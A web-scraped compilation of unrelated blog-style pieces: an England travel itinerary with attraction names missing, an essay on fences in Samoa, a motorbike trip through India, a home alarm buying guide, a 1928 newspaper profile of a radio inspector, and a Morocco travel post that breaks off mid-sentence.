in. The trail took us through Ebrington, Paxford, Aston Magna, Draycott, and Broaden Campden, all with its own unique charms.</li>    <li>Chipping Campden: A large market town with a happening High Street (the town center in many of these small English towns). The town has several churches, the biggest and most interesting of which is St. Jame&#x2019;s, which also has an interesting cemetery around it with some very old tombstones.</li>   </ul>   <h3>Day 7</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: All three of these houses are way too touristy and it often feels like they are trying to draw some strained connection to Shakespeare in order to turn them into tourist attractions. The building at Nash&#x2019;s House, for instance, isn&#x2019;t even the original house that actually had some remote ties to Shakespeare, but rather was just the building that happens to be on the site of the original structure. You can see the building in which Shakespeare was born from the touristy pedestrian-only Henley Street that runs directly behind the building, so you can just pose there for a picture and save yourself money and time by skipping the cheesy, conjecture-filled exhibition inside. Actually, all of the Shakespeare houses are easily skippable without great loss if you are pressed for time.</li>    <li> on the River Avon: There are several boating places in Bath. Punting really requires good balance, and it takes awhile to pick it up. If you are just looking for a nice, relaxing float down the river, rent a row boat instead.</li>   </ul>   <h3>Day 8</h3>   <ul>    <li>: This movie stand-in for Pemberley from <em>Pride and Prejudice</em> is a jewel of a mansion set amid a wealth of natural beauty. The interior of the mansion looks awesome, but the grounds really steal the show, whether it&#x2019;s the rock garden or the maze or the dahlia garden in full bloom or just the rolling hills that surround the place.</li>   </ul>   <h3>Day 9</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: This was the most interesting of the Shakespeare houses as it had a cute garden and more character than the others. One of the guides gave a very nice talk about the kitchen area, pointing out different pieces of equipment and explaining how they gave rise to certain phrases that we commonly use today. It also feels less touristy than the other houses.</li>    <li>: &#x201c;Britain&#x2019;s Ultimate Castle&#x201d;, as the attraction bills itself, is torn between making itself a fun place or an educational place, and it does neither well. The castle itself is pretty nice to walk around in, but the exhibitions, such as a wax-mannequin exhibit about the sex scandal the former Lady of Warwick was involved in, and entertainment are too cheesy but not all that &#x201c;fun&#x201d;. I would say it&#x2019;s not worth the price and can be skipped. If you want to see old castles, England has plenty that are less cheesy.</li>   </ul>   <h3>Day 10</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: Who knew you could get pulled pork on the streets of Stratford-upon-Avon? And game-meat pie, too! Too bad it&#x2019;s only once a year.</li>    <li>Walking around Stratford: The area around the River Avon is very touristy and crowded, but follow the river for a few minutes and you start getting into nice and quiet neighborhoods along the banks of the river. Watch barges sail up and down the river through a series of locks. On Saturdays, the square where the statues of Shakespeare and characters from his plays stand has a number of interesting street stalls selling antiques and miscellaneous knickknacks.</li>   </ul>   <h3>Day 11</h3>   <p><strong>London</strong></p>   <ul>    <li>: In all honesty, the actual ceremony is not all that interesting, but I guess this is one of those do-it-so-you-can-say-you-did-it things when visiting London.&#xa0;If you are not right up front against the fence, you&#x2019;re not going to get a great view, and if you are anywhere behind the first couple rows of spectators, you can pretty much forget about seeing anything unless you are 7 feet tall. So get there at least an hour early if you want to be in the front (we got there 30 minutes early and already the first row was filled up). Another option is to position yourself along the road leading to the gates so you can see the guards enter and leave the palace grounds.</li>    <li>: It&#x2019;s big and it&#x2019;s a must-see for art lovers. Photography is not allowed anywhere in the building. Don&#x2019;t eat in the cafe, which serves very mediocre food.</li>    <li>: This looks like a nice space, but it&#x2019;s also very crowded. In addition, when we went, there was a concert being held at the square, and the stage blocked a good chunk of the space, so we really couldn&#x2019;t see the square without obstructions.</li>    <li>: I was underwhelmed by this spot, which is just a big, busy intersection. The island in the middle of the intersection is filled with people taking pictures, but really, this attraction is rather shrug-inducing.</li>    <li>: I guess this is a fine area if you are into shopping at generic department stores while traveling abroad. And a lot of people must like to do that, since this area is very crowded. However, any foreign destination with five Starbucks locations in a 2-mile radius holds little charm for me. Just imagine your upscale local mall with more people. In fact, skip this area and just hit up your local mall.</li>    <li>: It&#x2019;s pretty much like the Chinatowns I&#x2019;ve been to in the United States, except a bit cleaner and neater. Just about every restaurant has a window displaying their roast ducks. It borders the theater district, so this could be a decent place for a pre-show meal if you&#x2019;re going to watch one of the numerous musicals on stage in London at any one given time.</li>   </ul>   <h3>Day12</h3>   <p><strong>Dorking</strong></p>   <ul>    <li>: The hill is somewhat steep but definitely walkable, and the climb is worth it as the top offers a great view. If you are going by train, get off at the Box Hill and Westhumble station and it&#x2019;s just a 15-minute walk from there to the foot of the hill.</li>    <li>: This was an unexpectedly charming little town with a nice High Street that has some unique shops as well as chain fronts. One of the side streets is filled with antique shops, though most of them are rather high-end. The Surrey Yeoman pub on High Street serves good meals.</li>   </ul>   <h3>Day 13</h3>   <p><strong>London</strong></p>   <ul>    <li>: One of the more interesting attractions in London, and it&#x2019;s presented pretty tastefully, unlike other grand structures such as Warwick Castle. This place is big, so plan on spending more than half a day here if you want to see everything. The Beefeaters tour, which is included in the price of admission and is given every half hour, is a must-do. While walking on the tower walls, be sure to look out and see where the yeoman warders (the guys giving the Beefeaters tour) live &#x2014; inside the tower grounds.</li>    <li>: It&#x2019;s expensive and touristy, but it does give a good aerial view of London as you would expect from a giant ferris wheel. Book in advance online and avoid the ticket line. You might want to bring some binoculars. The pier area around the London Eye is lined with other tourist traps and restaurants.</li>    <li>Parliament and Big Ben: Two obvious must-sees that are overrun with tourists. They are just across the bridge from the London Eye, so you can take care of all three in one stop.</li>    <li>: Do you enjoy straining your neck to see a modest two-story building standing a good distance behind a metal gate patrolled by security guards? If so, then the prime minister&#x2019;s residence is for you. Otherwise, it&#x2019;s not worth a special trip just to see it. If you happen to be in the neighborhood, just stop by for a minute. It&#x2019;s really as dull as it sounds.</li>    <li>: You can either go see the Globe Theatre when it&#x2019;s not in use, or you can see it the way it&#x2019;s meant to be seen &#x2014; with British actors on stage performing Shakespeare. Tough call, right? Seriously, this was a terrific experience, especially since we had good weather. You can either reserve a seat or pay just a few pounds to stand in the yard area in front of the stage. Standing in the yard has its charms, especially since the stage is set up to allow the audience down there to get very close to the actors. But consider whether you are willing or able to stand for three hours like at a rock concert. Also, the yard is uncovered, so you might get rained on. As for seating, there really didn&#x2019;t seem to be many bad seats in the house, as the place is pretty small so even the upper levels get a good view. The seats are backless wooden benches, and you may want to spring a couple extra pounds to get a cushion since you will be sitting for a while. No photography is allowed during the performance, but it&#x2019;s fine before or after the play and during intermission. As for dress codes, there were certainly some people who were dressed up, but the atmosphere is pretty informal with a lot of informally dressed tourists, so casual clothes would fit right in.</li>   </ul>   <h3>Day 14</h3>   <p><strong>London</strong></p>   <ul>    <li>: You can&#x2019;t miss this stop. It was probably the most interesting attraction we visited in London. Plan on spending most of a day here if you want to see everything. The ancient Egyptian and Greek rooms are the best, and the Assyrian reliefs are impressive in their fine details. And it&#x2019;s all FREE!</li>    <li>: A lame, uninspiring street of antique and touristy shops. Don&#x2019;t go if you are not into antiquing, and even then, the stores aren&#x2019;t all that interesting. The antique stalls only come out on Saturdays. The other shops on the street are just a waste of space as they seem to sell mostly touristy knickknacks.</li>    <li>: It&#x2019;s a nice big green space, but a giant park is still just a park. Go on a nice day if you want to people-watch. The streets around the park are a zoo.</li>    <li>: Unless you are violently anti-religion, you should definitely try to attend a service, or at least evensong, at Westminster Abbey as a cultural experience if nothing else. The boys&#x2019; choir is excellent, and the interior architecture is impressive.</li>   </ul>   <h3>Day 15</h3>   <p><strong>London</strong></p>   <ul>    <li>: It&#x2019;s very neat to walk around and see the final resting places for famous people. It also made me think about the Egyptian mummies at the British Museum: If you&#x2019;re relatively famous and accomplished in your time and you&#x2019;ve been dead for a few hundred years, you are honored with elaborate tombs that are paid homage by millions each year. If you are extremely famous and accomplished in your time (say, being a Pharaoh) and you&#x2019;ve been dead for a couple thousand years, your tomb gets hacked open and your body yanked out of its coffin and put in a glass case for all to see. Will people be digging up Queen Elizabeth&#x2019;s tomb in a couple thousand years and putting her remains on display in a museum?</li>    <li>: This is a nice, manageable gallery that can be done in 1-2 hours.</li>    <li>: This is neat to try and a quick way to get from one side of the river to another. It&#x2019;s a cheap substitute for a full-on Thames cruise, though the Thames&#x2019; banks are not all that scenic anyway. The route does take you past the London Eye, Parliament, and Big Ben.</li>    <li>: Be aware that only the morning tours let you into the theatre itself. The afternoon tour, which we did, is a walk along Bankside with a knowledgeable guide who tells you a bit about the history of the area. The tour includes a stop at the Rose Theatre, a predecessor to the original Globe Theatre where Shakespeare acted and had his plays performed and an eventual victim to the Globe&#x2019;s success after it lured the Bard away from the Rose. What remains of the Rose Theatre is just a small portion of the foundation, and that&#x2019;s all kept submerged for preservation purposes, so you can&#x2019;t really see much. The tour also takes you to the spot where the original Globe Theatre stood, now the site of a plain-looking but apparently historically significant building &#x2014; one of the earliest examples of concrete being used in a building. The tour takes about one hour and is kind of interesting for history buffs, though you can see the original site yourself since it&#x2019;s just on the side of the street and there&#x2019;s a plaque in front of it.</li>   </ul>  </div>  
   <div>   <p>I have a fence again. It&#x2019;s made of chainlink and it has lines of barbed wire running along the top of it. It&#x2019;s posts are firmly grounded in boxed concrete so that dogs and pigs and pesky chickens cant dig their way under it. There&#x2019;s a gate with a padlock and every time I drive my car in or out, I have to stop and get out to unlock the gate and swing it wide open.&#xa0; It&#x2019;s annoying, especially when its pouring with rain,&#xa0;and I wish I were wildly rich and could afford an automatic gate with a remote control so I could zap my gate open and closed. But still, it&#x2019;s a gate and it&#x2019;s a fence and I like it.</p>   <p>When people&#xa0;from far away&#xa0;think&#xa0;about Samoa, they don&#x2019;t think of fences and gates. They muse upon postcard pictures of white sand beaches and scuba diving in azure waters. They reminisce in Samoa chatrooms about how much they miss the islands (that they&#x2019;ve never actually lived in. But their parents did. And maybe they&#x2019;ve come to visit.) and the &#x2018;<em>communal</em> <em>living&#x2026;where everyone shares&#x2026;and life is much slower and easier&#x2026;because you don&#x2019;t have to work as hard&#x2026;you can just grow some taro and live off the land&#x2026;together with your aiga&#x2026;everyone helping each other&#x2026;</em>&#x2018; There&#x2019;s no fences in those golden visions of Samoa. There&#x2019;s no mangy dogs that bite you or child vendors selling air freshner outside McDonalds in these visions either. But hey, we all need our golden fantasies, don&#x2019;t we?</p>   <p>Sure, lots of folks in Samoa <strong><em>don&#x2019;t</em></strong> have fences. Lots of folks <strong><em>do</em></strong> live in villages with one family&#x2019;s cookhouse bordering on another&#x2019;s. I don&#x2019;t know if life there is <em>&#x2018;easier&#x2026;happier&#x2026;slower&#x2026;better&#x2019;</em> because I don&#x2019;t live in a village like that. I live in Apia and I have a fence. Of course I&#x2019;m not the only one who has a fence. There&#x2019;s a neighbour up the road with a gleaming line of chainlink all around their tiny faleo&#x2019;o. Its clear they have their priorities straight. Like us, they built their fence first before building a house. Unlike my yard which is a barren wasteland, they also have carefully nurtured hibiscus hedges and rows of colourful flowers in their garden.&#xa0;When we lived up the mountain last year, our neighbour had a massive cement wall surrounding their&#xa0;luxurious home. At the top of this wall was some decorative trim that caught the sunlight and sparkled. &#xa0;It took me several weeks to realize that&#xa0;it was thick triangular shards of glass, the size of my hand, wedged into the concrete and pointing skywards.&#xa0;It was&#xa0;explained to me that there had been a break-in at that house and when the #ManOfTheHouse chased after the intruder &#x2013; he had been slashed with a knife. So post-breakin, the family had added the glass to their wall. Pretty <strong><em>and</em></strong> painful.</p>   <p>My fence&#xa0;makes me happy.&#xa0;During the daytime, I know Bella can&#x2019;t ride her bike on the road because the gate is locked. At night when the zombies and mass murders are most likely to be out &#x2013; my dog patrols our fence and I&#x2019;m reassured because while chainlink and barbed wire wont keep a zombie out for long, it should make enough noise trying to get over that I will wake up and have time to get my gun and blow it&#x2019;s head off from 20m away. (of course I need to buy a gun by then. And take some lessons so I can be a sniper worthy of Call of Duty.) In the meantime, my&#xa0;fence makes me feel safer than if I didn&#x2019;t have a fence.</p>   <p>It&#xa0;also means that unlike when we lived in New Zealand, &#xa0;I wont have random people knocking on my door when I don&#x2019;t want them to. No more rambling conversation from the drunken lady who lived in her van parked in front of the neigbor&#x2019;s house and who wanted to chat at least once every two days. No more cringing inwardly and making up excuses for the door sales reps as to why you can&#x2019;t buy a&#xa0;security system&#x2026;new tires&#x2026;or donate to dig&#xa0;wells for poor people in some distant&#xa0;nation. &#xa0;New Zealand was a nice country and had lots of nice things (like Boston Cream donuts, really crisp apples, cauliflower that didn&#x2019;t cost $35 for one, and schools with lots of playgrounds and teachers who didn&#x2019;t yell at small children and make them cry.) But NZ didn&#x2019;t have chainlink fences. At least not in West Auckland. And I really missed my fence. I&#x2019;m glad to be home in Samoa and to have a fence again.</p>   <p>So next time you&#x2019;re envisioning the wonders of the paradise that is Samoa? Yes, dream of beaches and harmonious idyllic villages. But also add in some fences. Gates. Barbed wire. A few concrete walls with decorative glass shards. Because we have those in Samoa too.</p>   <p>&#xa0;</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <p>I had heard all the stories of buses on their backs like beetles at the bottom of ravines and head on collisions between lorry and scooter. I pictured grid locked roads in a haze of fumes and the deafening sound of horns. I chewed my nails in deliberation. But after some gentle persuading and three days in India, I found myself on the back of a Royal Enfield.</p>   <div>    <p>(&#xa9; imganuncios)</p>   </div>   <p>On the 30th&#xa0;November, we left the fluorescent lights and cocktail haze of Anjuna beach and headed for Dandeli, a small town nestled in the jungle of the Kali River Basin in the north-west of Karnataka state. We wound our way further and further into the wilderness and up the mountains and the sun bathed the surrounding jungle in its final orange glow. Soon there was nothing but the cold air and the moon peering through cotton clouds, the odd home glowing in the twilight. We arrived shaking and exhausted.</p>   <div>    <p>(Goa to Dandeli up the mountains through the jungle &#xa9; Isabella Thompson)</p>   </div>   <p>We were not supposed to have travelled at night, but the route had taken much longer than we anticipated and we spent the last two hours navigating potholes in the dusty dark, hoping with excited nerves that bike wouldn&#x2019;t break down in the middle of the shadowy jungle.</p>   <p>Dandeli was beautiful. A small industrial town in the middle of the jungle with not much to offer the odd passing tourist, it was unapologetically itself. Great Banyan trees lined the central roads, an old car sat beneath them, left to the weeds. Smoke from the factory drifted through the night full with the sound of chanting from a temple covered in fairylights.</p>   <blockquote>    <p>&#x2018;We exchanged half understood stories and laughed, a lot.&#x2019;</p>   </blockquote>   <p>The following day, after a long morning trying to make plans, we stumbled upon a hidden paradise out in the jungle down a long twisting road. Nature&#x2019;s Nest guesthouse sat quietly in the shade, bordered by rice fields that sloped into the jungle.</p>   <div>    <p>(Nature&#x2019;s Nest Guesthouse in the Jungle outside Dandeli &#xa9; Isabella Thompson)</p>   </div>   <p>We spent two days eating feasts of homemade food prepared by the gentle and generous people who worked there, and an afternoon in a kayak on the huge turquoise ribbon of the Kali River.</p>   <p>On our final evening, the farmer who tended the land next to the guesthouse invited us in for some food and to meet his family. We exchanged half understood stories and laughed, a lot. Those people who had so little, offered us so much. I felt blessed. We wouldn&#x2019;t have found such generosity if we hadn&#x2019;t been on the motorbike.</p>   <div>    <p>(Just about to leave Nature&#x2019;s Nest for Hampi first thing in the morning &#xa9; Isabella Thompson)</p>   </div>   <p>3<sup>rd</sup> December. We headed east for Hampi, the ancient capital of India. The long road through the jungle dappled with sunshine and potholes suddenly gave way to undulating farmland. We drove through endless fields of bleached crops, past people washing in rivers and huge red squares of chillies drying in the sun.</p>   <p>When we hummed through quiet villages, the locals would stop what they were doing and stare. Children would shout and wave. On these long journeys, following narrow dusty roads through the middle of nowhere, I felt that I was experiencing the soft, curious underbelly of India.</p>   <p>We spent six days in Hampi, immersed in the ancient spirituality that flowed like a mysterious whisper through the landscape and connected the travellers.</p>   <div>    <p>(Music Temple, Hampi &#xa9; Isabella Thompson)</p>   </div>   <blockquote>    <p>&#x2018;I felt that I was experiencing the soft, curious underbelly of India&#x2019;</p>   </blockquote>   <p>On the 9<sup>th</sup> December, we hit the road once more and travelled for two days towards Coorg. Now known as Kodagu, Coorg is an area in the south west of Karnataka where the British settled in 1834 and it&#x2019;s still a relatively unknown area on the tourist map.</p>   <p>After a wrong turn, we spent an uneasy night in a little town called Sira where disquiet rolled with the rubbish along the narrow alleyways.</p>   <div>    <p>(One of the old plantation gates, Coorg &#xa9; Isabella Thompson)</p>   </div>   <p>Lush undergrowth sprawled into the sides of the road and crept towards the clouded peaks of the Western Ghats as we neared Kodagu.

We left the emerald shadows of Coorg and headed back towards the west coast. In our crossing of the Western Ghats, we drove through cold wind and overcast skies, sudden downpours and sticky heat along a slippery road of red clay.</p>   <p>Finally arriving in Mangalore, we hung our wet clothes on the chipped blue railings of our window and lay on our narrow twin beds, watching the bugs fly around the fluorescent beam, too exhausted to lose ourselves in the crazy city.</p>   <p>15th&#xa0;December. To reach the hippie haven of Gokarna, we dodged and screeched along a busy highway, stopped briefly at Malpe beach &#x2013; beautiful but covered in rubbish &#x2013; where a wide-eyed frog was stuck in the light socket of our ant-infested room. We spent a week in Gokarna, swimming in the cool water in a hashish haze and lying under the stars, the night humming with voices and the sound of drums.</p>   <div>    <p>(Gokarna &#xa9; Isabella Thompson)</p>   </div>   <p>As Christmas approached and our month on the bike drew to an end, we decided to spend our final few days in southern Goa. After spending Christmas Eve on Patnem beach full of people and exploding boxes of fireworks, we searched for somewhere more removed for Christmas day and stumbled upon Galgibaga beach.</p>   <p>The expanse of white sand was almost completely empty, bordered by tall pine trees and rolling hills along the coastline beyond. When we got too hot from lying in the sun, we wandered through pine shade and came across the hammocks and colourful plastic tables of a restaurant. The afternoon was spent swinging in the trees, drinking juice and reading books. At sunset, we sat on the empty beach and watched a dolphin pirouette in front of the sinking pink sun. We couldn&#x2019;t have imagined a more perfect Christmas. It happened because we had the freedom of the bike to wander twenty minutes down the coast.</p>   <div>    <p>(Sunset on Christmas day, Galgibaga beach &#xa9; Isabella Thompson)</p>   </div>   <p>By the end of our month, that magnificent chrome beetle had become part of our journey and we were both sad to see her go. Our second month in India was very different to our first.</p>   <p>We still found ourselves wide-eyed in awe at the beauty of it all; the rippling green canals of the Kerala backwaters, a handful of shimmering feathers from the Mysore Avery, a boy balancing on the train tracks holding his friends&#x2019; shoulders.</p>   <div>    <p>(Feeding the monkeys at the Hanuman Temple, Hampi &#xa9; Isabella Thompson)</p>   </div>   <p>However, we had hugely underestimated the preparation that needed to go into organising our travel after the freedom of the bike. The trains we tried to book were often full and the tourist buses weren&#x2019;t cheap.&#xa0;<span>In the long hours waiting in the hot dust, handing fistfuls of rupees to greasy-haired travel agents, I couldn&#x2019;t help remembering the ease and low cost of the motorbike.</span></p>   <p>At only 300 rupees each per day (equivalent to &#xa3;3 or $4 and 65 cents), and only 600 rupees to fill a tank, the Enfield was a much cheaper way of travelling. We could come and go as we pleased without having to constantly argue with rickshaw drivers, their teeth stained brown with beetle leaf juice.</p>   <div>    <p>(The Dandeli Supa Dam &#xa9; Isabella Thompson)</p>   </div>   <p>The difference I found most surprising between travelling by bike and by train or bus, was the people we met along the way. From big tourist location to the next, the majority of the people we met were impersonal and uninterested in comparison to most of the people we met in the rural areas we visited on the Enfield.&#xa0;From the half-hearted touts in the shade of their shops along Varkala clifftop to the Babas of Varanasi, their legitimacy hidden in great clouds of chillum smoke, it felt like the locals of traveller destinations were most interested in what lined our pockets.</p>   <p>So although we always ended those long days exhausted, shaky and covered in dirt, and we were driven off the road several times, travelling by bike through India was a far less stressful experience than using the public transport.</p>   <p>It was also a more freeing one, simply watching the landscape change as the hours passed, the sun on our necks and the warm wind in our faces.</p>  </div>

   <div>   <p>In this day and age, sad as it seems, more and more homeowners are choosing to install home security alarm systems. While choosing a home security alarm system may seem like a straightforward task, there are actually many considerations involved in choosing the correct alarm system for your home.</p>   <p>Your home alarm system can be as simple as a few relatively inexpensive devices placed at each door and window, or as complicated and as expensive as you wish to go. You can choose monitored services and unmonitored. You can choose to have security cameras, not have security cameras, or put up fake security cameras. You can choose home security systems which alert you in case of fire or carbon monoxide, or again, you can have a monitored system where someone on duty is alerted to your danger before you even become aware and calls emergency personnel for you.</p>   <p>As you can see, one factor which WILL have to be considered is cost.</p>   <p>HOME SECURITY SYSTEM COSTS</p>   <p>Obviously, it is difficult to place a price on the peace that comes with knowing that you have adequately protected your home and your family. However, in the real world, we often have to evaluate the costs of things we desire or need, and this extends to home security systems. Parts and pieces for a home built security system are available from such sources as Radio Shack, which you would expect, and Wal-Mart, which you might not! Even do-it-yourself systems such as these can cost a few hundred dollars and, while providing basic home security, usually will not provide monitoring in the event of your absence. Some do-it-yourself components can be found which will notify emergency response activities without you having to take action yourself, but with every bell and whistle (literally) which you add, the cost will go up.</p>   <p>Now, when I was talking about a do-it-yourself home security system, you probably thought I was giving the good news first. As you read about how expensive this can get, you probably thought that was either the bad news, or the good news going sour.</p>   <p>Wrong. I started off with the BAD news.</p>   <p>The two major advantages I see to do-it-yourself security systems is that you can buy one unit at a time for a relatively low cost, and, if you are the handyman type, you can have the joy of installing the stuff yourself.</p>   <p>Here&#x2019;s the good news.</p>   <p>There are many good quality home security companies out there. You may or may not have heard of ADT, Brinks, and Great Alarms, but you may NOT be familiar with their services and costs. While offers change from time to time and vary from company to company, prices are actually quite reasonable considering services provided. At the time of writing this article, a quick survey of just a few companies found installation costs ranging from free to a little over $300.00. Since these generally are monitored systems, you can expect to pay a monthly fee for the monitoring service, but it usually is only about $30.00 per month. Again, this may vary from company to company, so by all means, shop around.</p>   <p>I personally believe that when you consider what you get with a professionally installed and monitored home security system, you will probably skip the trip to Radio Shack or Wal-Mart and hire one of these companies to install your system.</p>   <p>COMPONENTS AND SERVICES OF A MONITORED HOME SECURITY SYSTEM</p>   <p>Actual components and services will vary from company to company, but here is an overview of the components and services you might expect to get from a home security system.</p>   <p>Home Security System Components</p>   <p>*Command Stations: This may be referred to by various names depending on the service provider. Great Alarms calls it a &#x201c;command station&#x201d;, ADT a &#x201c;touchpad&#x201d;, and Brinks a &#x201c;keypad&#x201d;. From this command point, the system can be armed or disarmed, help can be summoned, warnings can be given to others in the house by means of a device such as a horn, whistle, chime or similar item. It is often possible to get more than one station or keypad installed, such as one in the living area and one in the bedroom.</p>   <p>*Door And Window Sensors: These are generally simple devices, but when you buy them one by one yourself, their cost can really add up. Many professional companies expect to make their money off the monthly monitoring. Home security companies can acquire these items in bulk at much lower prices than you or I would pay, and that is why installation as a package, is often much less than what you would have to pay just for the items, if you bought them individually yourself.</p>   <p>*Motion Detectors: Should an intruder approach your home or by some means gain entry, motion detectors can be used to sense their presence and activate alarms or summon help.</p>   <p>*Remote Controls: In addition to the command station, touchpad, or keypad, many systems include a remote device which you may carry with you. These range from small units suitable to be carried on a keychain to larger units intended to be carried from room to room within your house.</p>   <p>*Sensors: There are sensors available to detect fire, carbon monoxide, heat, moisture, breaking glass and flex.</p>   <p>*Alarms And Other Warning Devices: The old familiar &#x201c;alarm&#x201d; is almost pass&#xe9;. You can get sirens, chimes, and even strobe lights to warn you of break-ins or other emergencies.</p>   <p>*Security Cameras: While most home security systems that the average family can afford will not use security cameras, this is still an additional option.</p>   <p>Home Security System Services</p>   <p>Once you have seen the short list of components above, you will have a pretty good idea of what services can be provided. Most commonly, intrusion or activation of a sensor by other means, by fire or carbon monoxide, for example, is the cue for the monitoring team to go into action. Primarily, they can summon police, fire, or emergency medical personnel for you if you are incapacitated or away from home. Since this service is around the clock, it provides you and your family with a sense of security and buffer of safety that may well be worth the cost. Some companies also provide security review services to help you judge your particular home security situation and options for defense. Again, these services, and their costs, vary from company to company, so shop around.</p>   <p>HOME SECURITY ON THE CHEAP</p>   <p>If you honestly feel that a home security system is out of your price range at the moment, there are a few inexpensive steps you can take to possibly improve your situation.</p>   <p>First, make sure that all your doors and windows lock. If several people may have had access to keys previously, go ahead and change the locks and make sure that only the people that need them have keys. This trip to Wal-Mart or Home Depot will be nowhere near as expensive as the cost of a break-in. Make sure all your windows can be locked and ARE locked, except when YOU want them to be unlocked.</p>   <p>Second, light the areas around your home at night where someone could get close and break in. There are solar powered lights which can be used to cut down on your electric bill. Lighting can be attached to inexpensive motion detectors.</p>   <p>Third, put all emergency services on speed dial, and make sure numbers are prominently posted near all phones anyway. Don&#x2019;t assume that 911 will always do the job. Sometimes a call directly to a fire department may get faster response.</p>   <p>Fourth, make a plan for an emergency and make sure that everyone realizes their job and where to meet up if people get separated.</p>   <p>Fifth, buy an air horn and don&#x2019;t be afraid to use it. You can apologize to the neighbors later.</p>   <p>Sixth, there are places where you can buy signs for your yard and decals for your windows. Nobody has to know you never got around to buying the system, do they?</p>   <p>Seventh, get your hands on some fake security cameras. I don&#x2019;t exactly place a lot of personal faith in this one, but there are some reasonably realistic looking fake security cameras around, and just &#x201c;not knowing&#x201d; may be enough to deter an inexperienced burglar looking for an easy score. The cameras I have seen move, and have a pulsing red light which makes it look official.</p>   </div>  
   <div>   <p>It is assumed that this is the same George Scull who served as the first manager at the Musick Memorial Radio Station from 1942 to 1947.</p>   <p><em>NZ Truth, Thursday 11 October 1928, p 6</em></p>   <h2>Helio George</h2>   <p>WHEN you come to think of it, radio inspectors have rather an unenviable sort of a job.</p>   <p>Their chief public pursuits appear to be rounding up defaulters or sleuthing after oscillating &#x201c;Oswalds!&#x201d; and those execrated valves which bay o&#x2019; nights like a mastiff in distress!</p>   <p>But so far the <b>iron</b> hasn&#x2019;t entered the soul of George H. Scull, the spruce and natty inspector at <b>Auckland</b>. Evidently he takes the philosophical view that jobs are mostly what- you make them.</p>   <p>In the books of the P. and T. Department, George has a score of years on the credit side. Becoming exceedingly bored with common or garden telegraphy, he switched over some years ago to the Marconi variety. He did many a weary stretch in the silences of the night with the receivers glued to his lobes. But he got &#x201c;next&#x201d; to the mysteries of radio and caught its glamor.</p>   <p>George is a handy chap to know when you are unable to make a choice between a neutrodyne and a counterphase, and he doesn&#x2019;t bewilder you with a stream of technical verbiage.</p>   <p>He is a captain in charge of the Northern Signal Depot. He rather dislikes militarism as such, but has a lot of use for the signalling arm of the service, with its field wireless, its semaphores and helios and buzzers &#x2018;n&#x2019; everything.</p>  </div>

   <div>   <div>    <h1>Traveling From Fez Morocco to Marrakesh&#x2014;The Long Way: Day One</h1>   </div>   <div>    <p>We planned to spend the majority of our time in Morocco exploring a number of the country&#x2019;s cities: Tetouan, Tangier, Fez, Marrakesh and even a few hours in Casablanca. Although we did want to spend most of our time in cities, we also wanted to sample a few other parts of the country. We decided on a four day trip, beginning in Fez and ending in Marrakesh during which we hoped to:</p>    <ul>     <li>See and learn the histories of the historic cities of Meknes and Volubilis;</li>     <li>Travel to the southern part of the country to &#x201c;experience&#x201d; Berber Country&#x201d; and the desert with a night in a Berber tent (although we decided that we have already taken more than enough camel rides to last the rest of our lives); and</li>     <li>See the sights and get a chance to explore the beauty of the country&#x2019;s mountains, deep gorges, small mountain town Kasbahs and tiny villages of both the Mid Atlas and High Atlas mountains.</li>    </ul>    <p>Since there are no trains through this region, and we didn&#x2019;t want to drive, we decided to invest in a car, driver and guide to take us through a customized itinerary based on a trip offered by . We were driven by , a very personable guide who speaks very good English and who always went out of his way to make sure we got the experience that we wanted.</p>    <p>The next few posts detail our stops and experiences.</p>    <p><b>Volubilis</b></p>    <p>Volubilis, which was originally settled in the 3<sup>rd</sup> century BC, is a 42 hectare site that originally housed about 15,000 people. It was annexed by and adopted as one of the most important regional capitals by the Romans in 45 AD. Over the next three centuries (prior to Rome&#x2019;s withdrawal) a forum and many grand public buildings and residences were constructed. Although only a portion of the site has yet been excavated, it is still more than worth exploring (especially for the mosaics) and when combined with a trip to Meknes (see below). Among the sites we found most interesting were the:</p>    <ul>     <li>The 26-foot tall Triumphal Arch and the Basilica, which have been restored to provide a close representation of what they looked like in Roman times. The arch, which unfortunately, lacks its original carved frieze and especially the chariot with six horses that graced the top, was dedicated to the Emperor and his mother for granting citizenship to the city&#x2019;s residents, and especially for exempting them from taxes. The Basicila, which was the meeting place for the city&#x2019;s rulers, is next to the forum (the public square) with its patio lined with sculptures of important Romans (the statues which have been found and reconstructed are now in museums).</li>    </ul>    <ul>     <li>A number of large patrician villas, where we could still see the outlines of rooms, courtyards and pools in which they collected rainwater. Best of all, many of them have wonderfully restored mosaics on their floors. Among the best examples are in the House of the Bathing Nymphs, House of the Labors of Hercules, House of the Knights, House of the Columns and House of Dionysus and the Four Seasons.</li>    </ul>    <p>Many tell stories, such as a detailing of Hercules&#x2019;s 12 labors, one of nymphs seeking to catch a glimpse of the bathing Diana, and a humorous portrayal of a champion horse rider riding a donkey backwards.</p>    <ul>     <li>Gordian Palace, the Capitol and the House of Columns for their remaining Doric, Ionic and Corinthian columns, including a selection of Corinthian columns with some straight, some fluted and others spiral.</li>     <li>Remains of aqueducts, public fountain, public latrine (which, we were told, had marble seats which patricians had slaves warm for their use) and the rest of the underground plumbing system that used lead pipes to bring water directly to the homes of the patricians;</li>    </ul>    <p>There are also foundations of homes from plebeian settlements and a museum (not yet open) that has a display of capital columns from the site.</p>    <p>Since only about one-third of the site had yet been excavated, many evidences of this early city remain to be found. Archaeologists, for example, know there must be a coliseum, but have so far found no traces. And with most excavation now being done by vacationing students, it will take a while before experts can gain a full picture of the city.</p>    <p><b>Moulay Idress</b></p>    <p>After leaving Meknes, we make a short stop at Moulay Idress, where we made our way through a food market walk to the Moulay Idress Shine of which non-Muslims can take pictures from the outside, but not enter. This moderate descendent of Mohamad, who many thought should be the successor to the prophet, was forced out in a power struggle and settled in Morocco, where he was accepted as Emir, before being assassinated.</p>    <p><b>Meknes</b></p>    <p>Then we were on to Meknes, which spent most of its early years (until the 17<sup>th</sup> century) as a small town of no note. Its fate changed dramatically when Moulay Ismail, the first Alaouite sultan, chose Meknes as his Imperial City and wasted little time or money in creating a city the fit its new status. And since he was a champion of dramatic Moorish architecture, in creating the Imperial City section of the now large city of Meknes.</p>    <p>The Imperial City is entered from the medina through Bab Mansour el-Aleuj, a tall, 52-foot gate that was built in 1672 and is supposed to be one of the most dramatic and have some of the most beautiful tile and mosaic decorations in Morocco.</p>    <p>The Kasbah, the fortress that protects the imperial city, has a double set of walls that surround wide avenues and large plazas 